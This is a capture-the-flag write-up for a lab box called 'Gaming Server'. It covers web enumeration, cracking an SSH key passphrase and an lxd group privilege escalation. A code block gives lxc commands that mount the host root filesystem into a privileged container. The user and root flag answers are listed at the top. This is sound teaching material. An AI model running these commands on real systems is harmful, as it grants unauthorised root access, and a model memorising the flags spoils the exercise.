### Gaming Server

export IP=10.10.3.50

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.


What is the user flag?
- a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

What is the root flag?
- 2e337b8c9f3aff0c2b3e8d4e6a7c88fc


nmap scan:

![](../../img/Pasted%20image%2020220828012352.png)

Per checking, we only have 2 ports, ssh and http

Visiting the webpage, we are greeted on the homepage:

![](../../img/Pasted%20image%2020220828012437.png)

Performing gobuster scan reveals that there are secret pages inside:

![](../../img/Pasted%20image%2020220828013219.png)

dict.list

![](../../img/Pasted%20image%2020220828012737.png)

secretKey

![](../../img/Pasted%20image%2020220828012748.png)

Uploads

![](../../img/Pasted%20image%2020220828012819.png)

manifesto:

![](../../img/Pasted%20image%2020220828012837.png)

So we have the rsa key, we will try to crack the hash using john the ripper:


![](../../img/Pasted%20image%2020220828012926.png)


Now that we have the password, what is the username?

Inspecting the page using F12 reveals a username: john

![](../../img/Pasted%20image%2020220828013014.png)

We can now login using ssh and the id_rsa key. 

Password for id_rsa: letmein

![](../../img/Pasted%20image%2020220828013258.png)


User flag:

![](../../img/Pasted%20image%2020220828013859.png)

#### Privilege Escalation
Upon checking, we cannot perform sudo -l as well as no crontab jobs and writable /etc/shadow, we can perform linenum, like so:

![](../../img/Pasted%20image%2020220828013401.png)

Looking below, linenum has found that we are a member of lxd group:

![](../../img/Pasted%20image%2020220828013505.png)


This is where i got stuck, since i have no idea about this technology. Searching for answers, this is the blogpost i found:

https://www.hackingarticles.in/lxd-privilege-escalation/


Steps:

1. git clone https://github.com/saghul/lxd-alpine-builder.git
2. build the package using sudo ./build-alpine. A tar.gz file will be provided after
3. Transfer the tar.gz file to the remote machine. But before that, mkdir /tmp on the victim's machine.
4. Once transferred, perform the ff:

```

lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage

lxc init myimage ignite -c security.privileged=true

lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

lxc start ignite

lxc exec ignite /bin/sh

```

Once done, go to /mnt/root and capture the flag!

![](../../img/Pasted%20image%2020220828013759.png)


END